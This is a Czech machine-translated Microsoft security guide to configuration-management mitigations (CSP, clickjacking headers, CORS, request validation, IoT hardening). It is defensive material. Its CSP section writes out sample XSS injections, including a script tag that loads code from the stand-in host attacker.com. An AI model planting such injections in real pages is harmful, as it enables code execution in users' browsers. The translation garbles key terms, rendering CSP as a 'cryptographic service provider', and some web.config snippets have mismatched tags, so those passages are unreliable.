---
title: Konfigurace správy – nástroj Microsoft Threat modelování – Azure | Microsoft Docs
description: způsoby zmírnění hrozeb, které jsou zveřejněné v nástroji pro modelování hrozeb
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
ms.translationtype: MT
ms.contentlocale: cs-CZ
ms.lasthandoff: 06/27/2018
ms.locfileid: "37028978"
---
# <a name="security-frame-configuration-management--mitigations"></a>Zabezpečení rámce: Správa konfigurace | Způsoby zmírnění rizik 
| Produktům a službám | Článek |
| --------------- | ------- |
| **Webové aplikace** | <ul><li>[Implementace obsahu zásady zabezpečení (CSP) a zakažte vložené javascript](#csp-js)</li><li>[Povolit filtr XSS prohlížeče](#xss-filter)</li><li>[Aplikace ASP.NET musíte zakázat trasování a ladění před nasazením](#trace-deploy)</li><li>[JavaScripty třetí strany přístup pouze z důvěryhodných zdrojů](#js-trusted)</li><li>[Ujistěte se, že ověřený stránek ASP.NET začlenit nápravu uživatelského rozhraní nebo obrany opěry pro klikněte na](#ui-defenses)</li><li>[Zajistit, že pouze důvěryhodné zdroje jsou povolené, pokud je povoleno CORS na webové aplikace ASP.NET](#cors-aspnet)</li><li>[Povolit Atribut ValidateRequest na stránkách ASP.NET](#validate-aspnet)</li><li>[Použít místně hostované nejnovější verze knihoven jazyka JavaScript](#local-js)</li><li>[Zakázat automatické sledování toku dat MIME](#mime-sniff)</li><li>[Odebrat záhlaví standardní server na weby systému Windows Azure předejdete tímto způsobem](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Konfigurace brány Windows Firewall pro přístup k databázovému stroji](#firewall-db)</li></ul> |
| **Webové rozhraní API** | <ul><li>[Zajistit, že pouze důvěryhodného zdroje jsou povolené, pokud je povoleno CORS na rozhraní ASP.NET Web API](#cors-api)</li><li>[Zašifrování částí webového rozhraní API konfigurační soubory, které obsahují citlivá data](#config-sensitive)</li></ul> |
| **Zařízení IoT** | <ul><li>[Všechna rozhraní správce jsou zabezpečená s silné přihlašovací údaje](#admin-strong)</li><li>[Ujistěte se, že neznámý kód nelze provést na zařízeních](#unknown-exe)</li><li>[Šifrování operačního systému a další oddíly zařízení IoT bit schránku](#partition-iot)</li><li>[Ujistěte se, že jsou povoleny pouze minimální služby nebo funkce v zařízení](#min-enable)</li></ul> |
| **Brána pole IoT** | <ul><li>[Šifrování operačního systému a další oddíly brána pole IoT se bit schránku](#field-bit-locker)</li><li>[Ujistěte se, že jsou přihlašovací údaje výchozí brány pole změnit během instalace](#default-change)</li></ul> |
| **Brána IoT cloudu** | <ul><li>[Ujistěte se, že Cloudová brána implementuje proces aktuálnost firmware připojená zařízení](#cloud-firmware)</li></ul> |
| **Počítač hranice vztahů důvěryhodnosti** | <ul><li>[Zajistěte, aby zařízení kontrolních mechanismů pro zabezpečení koncový bod nakonfigurovaný podle zásady organizace](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zajištění zabezpečení správy přístupových klíčů k úložišti Azure](#secure-keys)</li><li>[Zajistit, že pouze důvěryhodného zdroje jsou povolené, pokud je povoleno CORS na úložiště Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Povolení služby WCF na funkci omezení](#throttling)</li><li>[Zpřístupnění informací WCF prostřednictvím metadat](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementace obsahu zásady zabezpečení (CSP) a zakažte vložené javascript

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Úvod do zásad zabezpečení obsahu](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referenční informace o zásadách zabezpečení obsahu](http://content-security-policy.com/), [funkce zabezpečení](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Úvod do zásad zabezpečení obsahu](https://docs.webplatform.org/wiki/tutorials/content-security-policy) , [Můžete použít zprostředkovatele kryptografických služeb?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroky** | <p>Obsahu zásady zabezpečení (CSP) je obrany do hloubky mechanismus zabezpečení, W3C standardní, umožňující vlastníci webové aplikace tak, aby měl ovládací prvek v obsah vložený do své lokality. Zprostředkovatel kryptografických služeb se přidá jako hlavičku HTTP odpovědi na webovém serveru a na straně klienta vynucováno prohlížeče. Je zásadu na základě seznamu povolených IP adres – web můžou deklarovat sadu důvěryhodných domén ze které aktivní obsah, jako je JavaScript je možné načíst.</p><p>Zprostředkovatel kryptografických služeb poskytuje následující výhody zabezpečení:</p><ul><li>**Ochrana proti XSS:** Pokud na stránce bude zranitelný vůči XSS, útočník ho může zneužít 2 způsoby:<ul><li>Vložit `<script>malicious code</script>`. Tato zneužití nebude fungovat kvůli zprostředkovatele kryptografických služeb je základní omezení-1</li><li>Vložit `<script src=”http://attacker.com/maliciousCode.js”/>`. Tato zneužití nebude fungovat, protože útočník řídí domény nebude v seznamu povolených IP adres zprostředkovatele kryptografických služeb je domén</li></ul></li><li>**Kontrolu nad data exfiltration:** Pokud žádný škodlivý obsah na webové stránce pokusí připojit k externí web a odcizit data, připojení bude přerušeno CSP. Důvodem je, že cílové domény nebude v seznamu povolených IP adres na CSP</li><li>**Obrana proti opěry pro klikněte na tlačítko:** opěry pro klikněte na tlačítko se útoku techniku, pomocí které můžete nežádoucí osoba rámce originální webu a vynutit uživatelé kliknout na prvky uživatelského rozhraní. Aktuálně obrana proti opěry pro klikněte na tlačítko dosáhnete pomocí konfigurace odpovědi hlavičku X-Frame-Options. Některé prohlížeče respektují tuto hlavičku a budete dopředného CSP bude standardní způsob, jak bránit proti opěry pro klikněte na</li><li>**Vytváření sestav v reálném čase útoku:** při vkládání útok na webu povoleno CSP prohlížeče automaticky aktivuje oznámení koncovým bodem nakonfigurovaným na webovém serveru. Tímto způsobem CSP slouží jako upozornění systému v reálném čase.</li></ul> |

### <a name="example"></a>Příklad:
Příklad zásady: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Tato zásada umožňuje skripty načíst pouze ze serveru a google analytics server webové aplikace. Skripty načtené z jiné lokality budou odmítnuty. Pokud zprostředkovatel kryptografických služeb je povoleno na webu, následující funkce jsou automaticky zakázány zmírnit útoky XSS. 

### <a name="example"></a>Příklad:
Vložené skripty nebude spustit. Následují příklady vložené skripty 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Příklad:
Řetězce, nebudou hodnocené jako kód. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Povolit filtr XSS prohlížeče

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Filtr XSS ochrany](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Kroky** | <p>Konfigurace hlavičky X-XSS ochrany odpovědi ovládací prvky prohlížeče více webů skriptu filtru. Tuto hlavičku odpovědi může mít následující hodnoty:</p><ul><li>`0:` Tato akce zakáže filtr</li><li>`1: Filter enabled` Pokud je zjištěn útoku skriptování webů, aby bylo možné zastavit útoku, bude v prohlížeči úpravu stránky</li><li>`1: mode=block : Filter enabled`. Spíše než úpravu stránce, když je zjištěna útoky XSS, prohlížeč zabrání vykreslení stránky</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. V prohlížeči se úpravu stránky a sestavy porušení zásady.</li></ul><p>Toto je funkce chromu využitím CSP porušení sestav poslat podrobnosti identifikátoru URI podle svého výběru. Poslední 2 možnosti jsou považovány za bezpečné hodnoty.</p>|

## <a id="trace-deploy"></a>Aplikace ASP.NET musíte zakázat trasování a ladění před nasazením

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Přehled ladění ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET trasování – přehled](http://msdn2.microsoft.com/library/bb386420.aspx), [postupy: Povolení trasování pro aplikace ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [postupy: povolení ladění pro aplikace ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroky** | Pokud je povoleno trasování pro stránku, každý prohlížeče požadování že ho také získává informace o trasování, která obsahuje data o stavu interního serveru a pracovní postup. Tyto informace může být citlivé z hlediska zabezpečení. Pokud je povoleno ladění pro stránku, výsledkem chyby děje na serveru úplné zásobník trasování data uvedená v prohlížeči. Tato data vystavuje bezpečnostní informace o serveru pracovního postupu. |

## <a id="js-trusted"></a>JavaScripty třetí strany přístup pouze z důvěryhodných zdrojů

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | pouze z důvěryhodných zdrojů by měla odkazovat JavaScripty třetích stran. Koncové body odkaz musí být vždy na protokol SSL. |

## <a id="ui-defenses"></a>Ujistěte se, že ověřený stránek ASP.NET začlenit nápravu uživatelského rozhraní nebo obrany opěry pro klikněte na

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Klikněte na tlačítko-opěry pro list cheaty obrany OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - boje proti opěry pro klikněte na tlačítko s X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Kroky** | <p>Opěry pro klikněte na tlačítko, také známé jako "uživatelského rozhraní nápravu útoku", je při útočník využívá více vrstev průhledného nebo neprůhledného obelstít uživatel kliknutím na tlačítko nebo odkaz na další stránce, pokud se hodláte klikněte na stránku nejvyšší úrovně.</p><p>Toto rozvrstvení je dosaženo tím, že vytvoří škodlivé stránky pomocí elementu iframe, který načte stránku napadeného počítače. Proto že útočník "zneužívá" klikne na určené výhradně pro jejich stránky a jejich směrování na jinou stránku, pravděpodobně vlastníkem jiné aplikace, domény nebo obojí. Chcete-li zabránit útokům opěry pro klikněte na tlačítko, nastavte správné hlavičky odpovědi HTTP X-Frame-Options, které dávají pokyn prohlížeče nepovolíte rámcovacích z jiných domén</p>|

### <a name="example"></a>Příklad:
Hlavička X-FRAME-OPTIONS lze nastavit pomocí souboru web.config služby IIS. Soubor Web.config pro lokality, které by měly být nikdy ohraničeny fragment kódu: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Příklad:
Soubor Web.config kód pro lokality, které by měly být pouze ohraničeny stránkami ve stejné doméně: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Zajistit, že pouze důvěryhodné zdroje jsou povolené, pokud je povoleno CORS na webové aplikace ASP.NET

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Webové formuláře, MVC5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásada stejného původu a zabrání škodlivé weby čtení citlivá data z jiné lokality. Ale v některých případech může být potřeba bezpečně vystavit rozhraní API, které ostatní lokality spotřebovat. Křížové sdílení prostředků zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného původu. Pomocí CORS, server explicitně povolit některé žádostí napříč zdroji při odmítnutí ostatní.</p><p>CORS je bezpečnější a flexibilnější než dřívější techniky, jako je například JSONP. Jádro aplikace povolení CORS překládá při přidávání několika hlavičky HTTP odpovědi (Access - Control-*) k webové aplikaci a to lze provést několika způsoby.</p>|

### <a name="example"></a>Příklad:
Pokud je k dispozici přístup k souboru Web.config, můžete CORS přidány prostřednictvím následující kód: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Příklad:
Pokud přístup k souboru web.config není k dispozici, CORS mohou být konfigurovány tak, že přidáte kód CSharp následující: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Upozorňujeme, že je důležité zajistit, že seznam původů v atributu "Access-Control-Allow-Origin" je nastavena na sadu omezené a důvěryhodných původu. Nejsou-li nakonfigurovat tuto nesprávně (například nastavení hodnoty jako ' *') vám umožní škodlivé weby pro aktivaci žádostí mezi zdroji do webové aplikace > bez jakýchkoli omezení, což bude zranitelný vůči útoku proti útokům CSRF aplikace. 

## <a id="validate-aspnet"></a>Povolit Atribut ValidateRequest na stránkách ASP.NET

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Webové formuláře, MVC5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Žádosti o ověření - prevence útoků skriptu](http://www.asp.net/whitepapers/request-validation) |
| **Kroky** | <p>Ověření žádosti, funkce technologie ASP.NET od verze 1.1, zabrání serveru přijetí obsahu obsahující bez kódování HTML. Tato funkce je určena k zabránění některými útoky vložení skriptu, při kterém kód skriptu klienta nebo HTML můžete nechtěně odeslat na server, ukládat a poté jsou předloženy ostatním uživatelům. Stále důrazně doporučujeme, aby ověření všech vstupních dat a jeho v případě nutnosti kódování HTML.</p><p>Žádost o ověření se provádí tak, že porovnáte všechny vstupní data na seznam potenciálně nebezpečné hodnoty. Pokud je nalezena shoda, ASP.NET vyvolá `HttpRequestValidationException`. Žádosti o ověření funkce je ve výchozím nastavení povolena.</p>|

### <a name="example"></a>Příklad:
Tuto funkci však lze vypnout na úrovni stránky: 
```XML
<%@ Page validateRequest="false" %> 
```
nebo na úrovni aplikace 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Všimněte si tuto funkci žádosti o ověření se nepodporuje a není součástí MVC6 kanálu. 

## <a id="local-js"></a>Použít místně hostované nejnovější verze knihoven jazyka JavaScript

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | <p>Vývojáře, kteří používají standardní knihovny jazyka JavaScript, jako je nutné použít JQuery schválené verzích běžné knihovny jazyka JavaScript, které neobsahují nedostatky zabezpečení. Je vhodné použít nejvíce nejnovější verzi knihovny, protože obsahují opravy zabezpečení pro známých slabých míst v jejich starší verze.</p><p>Pokud nemůžete používat nejnovější verzi z důvodu kompatibility nižší než minimální verze by měl použít.</p><p>Přijatelné minimální verze:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery ověření 1.9</li><li>JQuery Mobile 1.0.1</li><li>Cyklus JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Sadu ovládacích prvků AJAX**<ul><li>Sadu ovládacích prvků AJAX 40412</li></ul></li><li>**Webové formuláře ASP.NET a Ajax**<ul><li>Webové formuláře ASP.NET a Ajax 4</li><li>Technologie ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nikdy načíst žádnou knihovnu JavaScript z externí webů jako veřejné sítím CDN</p>|

## <a id="mime-sniff"></a>Zakázat automatické sledování toku dat MIME

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [IE8 zabezpečení část V: komplexní ochranu](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Kroky** | Hlavička X-obsah-typ-Options je záhlaví HTTP, která umožňuje vývojářům určit, že obsah by neměl být MIME zachycení. Tuto hlavičku slouží ke zmírnění sledování toku dat MIME útoky. Pro jednotlivé stránky, která by mohla obsahovat ovladatelné obsah uživatele, je nutné použít záhlaví HTTP X-obsahu – typ-možnosti: nosniff. Pokud chcete povolit požadovaná hlavička globálně pro všechny stránky v aplikaci, můžete provést jednu z následujících|

### <a name="example"></a>Příklad:
Přidáte hlavičku v souboru web.config, pokud je aplikace hostovaná pomocí Internetové informační služby (IIS) 7 a vyšší. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Příklad:
Přidat hlavičku prostřednictvím aplikace globální\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Příklad:
Implementace vlastního modulu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Příklad:
Požadovaná hlavička pouze pro konkrétní stránky můžete povolit jeho přidáním do jednotlivých odpovědí: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Odebrat záhlaví standardní server na weby systému Windows Azure předejdete tímto způsobem

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Webová aplikace | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | EnvironmentType – Azure |
| **Odkazy**              | [Odebrání serveru standardní hlavičky na weby systému Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroky** | Záhlaví, jako je například Server X-používá technologii-, X-AspNet-Version odhalit informace o základní technologie a serveru. Doporučuje se tím potlačit tyto hlavičky brání tímto způsobem aplikace |

## <a id="firewall-db"></a>Konfigurace brány Windows Firewall pro přístup k databázovému stroji

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Databáze | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | SQL Azure, OnPrem |
| **Atributy**              | Není k dispozici, verzi SQL - 12 |
| **Odkazy**              | [Jak konfigurovat bránu firewall databáze Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [konfigurace brány Windows Firewall pro přístup k databázovému stroji](https://msdn.microsoft.com/library/ms175043) |
| **Kroky** | Brány firewall systémů pomáhá zabránit neoprávněnému přístupu k prostředkům počítače. Pokud chcete získat přístup k instanci databázového stroje SQL Server přes bránu firewall, je nutné nakonfigurovat bránu firewall v počítači se systémem SQL Server povolí přístup |

## <a id="cors-api"></a>Zajistit, že pouze důvěryhodného zdroje jsou povolené, pokud je povoleno CORS na rozhraní ASP.NET Web API

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | MVC 5 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení žádostí napříč zdroji v rozhraní ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [rozhraní ASP.NET Web API – podpora CORS v rozhraní ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásada stejného původu a zabrání škodlivé weby čtení citlivá data z jiné lokality. Ale v některých případech může být potřeba bezpečně vystavit rozhraní API, které ostatní lokality spotřebovat. Křížové sdílení prostředků zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného původu.</p><p>Pomocí CORS, server explicitně povolit některé žádostí napříč zdroji při odmítnutí ostatní. CORS je bezpečnější a flexibilnější než dřívější techniky, jako je například JSONP.</p>|

### <a name="example"></a>Příklad:
V App_Start/WebApiConfig.cs přidejte následující kód do metody WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Příklad:
Atribut EnableCors lze použít na metody akce v kontroleru následujícím způsobem: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Upozorňujeme, že je důležité zajistit, že seznam původů v EnableCors atributu je nastavena na sadu omezené a důvěryhodných původu. Nejsou-li nakonfigurovat tuto nesprávně (například nastavení hodnoty jako ' *') vám umožní škodlivé weby pro aktivaci žádostí mezi zdroji do rozhraní API bez jakýchkoli omezení > a díky rozhraní API bude zranitelný vůči útoku proti útokům CSRF. EnableCors může být doplněný o atribut na úrovni kontroleru. 

### <a name="example"></a>Příklad:
Zakázání CORS na konkrétní metodu v třídě, lze použít atribut DisableCors jak je uvedeno níže: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | MVC 6 |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení žádostí napříč zdroji (CORS) v ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroky** | <p>V technologii ASP.NET Core 1.0 CORS se dá nastavit pomocí middlewaru nebo pomocí rozhraní MVC. Při použití MVC k povolení sdílení CORS se používají stejné CORS služby, ale není CORS middleware.</p>|

**Postup-1** povolení CORS s middleware: Chcete-li přidat CORS pro celou aplikaci CORS middleware do kanálu požadavku pomocí metody UseCors rozšíření. Při přidávání middleware CORS pomocí třídy CorsPolicyBuilder lze zadat zásadu nepůvodního zdroje. Chcete-li to provést dvěma způsoby:

### <a name="example"></a>Příklad:
První je volání UseCors s lambda. Argument lambda přebírá objekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Příklad:
Druhá je definovat jeden nebo více s názvem zásady CORS a pak vyberte zásadu podle názvu v době běhu. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Způsob 2** povolení CORS v MVC: vývojáři taky můžete použít MVC použít konkrétní CORS na každou akci, na jeden kontroler nebo globálně pro všechny řadiče.

### <a name="example"></a>Příklad:
Na každou akci: Chcete-li určit CORS zásad pro konkrétní akci přidat atribut [EnableCors] na akci. Zadejte název zásady. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Příklad:
Pro každý řadič: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Příklad:
Globálně: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Upozorňujeme, že je důležité zajistit, že seznam původů v EnableCors atributu je nastavena na sadu omezené a důvěryhodných původu. Nejsou-li nakonfigurovat tuto nesprávně (například nastavení hodnoty jako ' *') vám umožní škodlivé weby pro aktivaci žádostí mezi zdroji do rozhraní API bez jakýchkoli omezení > a díky rozhraní API bude zranitelný vůči útoku proti útokům CSRF. 

### <a name="example"></a>Příklad:
K zákazu sdílení CORS pro kontroler nebo akce, pomocí atributu [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Zašifrování částí webového rozhraní API konfigurační soubory, které obsahují citlivá data

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Web API | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Postupy: Šifrování konfigurační oddíly funkce v technologii ASP.NET 2.0 pomocí rozhraní DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [určení konfigurace poskytovatele chráněné](https://msdn.microsoft.com/library/68ze1hb2.aspx), [pomocí Azure Key Vault k ochraně tajných klíčů aplikace](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Kroky** | Soubory konfigurace, například jako soubor Web.config, appSettings.JSON určený často používané pro udržení citlivé informace, včetně uživatelská jména, hesla, databázové připojovací řetězce a šifrovací klíče. Pokud tyto informace nechrání, vaše aplikace je zranitelný vůči útočníkům nebo uživatelé se zlými úmysly získání citlivé informace, jako je například účet uživatelská jména a hesla, názvy databáze a názvy serverů. V závislosti na typu nasazení (azure nebo místní), šifrování citlivých skupin konfigurační soubory pomocí rozhraní DPAPI nebo služby, jako je Azure Key Vault. |

## <a id="admin-strong"></a>Všechna rozhraní správce jsou zabezpečená s silné přihlašovací údaje

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Nasazení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | neuvedeno  |
| **Kroky** | Žádné administrativní rozhraní, která zveřejňuje bránu zařízení nebo pole by měly být zabezpečeny pomocí silné přihlašovací údaje. Také dalších zveřejněné rozhraní jako Wi-Fi, SSH, sdílené složky, FTP, by měly být zabezpečeny s silné přihlašovací údaje. Nepoužívejte slabé výchozí hesla. |

## <a id="unknown-exe"></a>Ujistěte se, že neznámý kód nelze provést na zařízeních

| Titul                   | Podrobnosti      |
| ----------------------- | ------------ |
| **Komponenta**               | Zařízení IoT | 
| **SDL fáze**               | Sestavení |  
| **Použít technologie** | Obecné |
| **Atributy**              | neuvedeno  |
| **Odkazy**              | [Povolení zabezpečeného spouštění a šifrování zařízení bit schránku na jádro IoT Windows 10](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Kroky** | Zabezpečené spouštění UEFI omezuje systému a povolit pouze spouštění podepsaný zadaný autoritou binárních souborů. Tato funkce zabraňuje neznámý kód se spustí na platformě a potenciálně oslabení postavení zabezpečení je. Povolení zabezpečeného spouštění UEFI a omezit seznam certifikačních autorit, které jsou důvěryhodné pro podepisování kódu. Zaregistrujte všechny kód, který je nasazen na zařízení pomocí jedné z důvěryhodné autority. |

## <a id="partition-iot"></a>Šifrování operačního systému a další oddíly zařízení IoT bit schránku

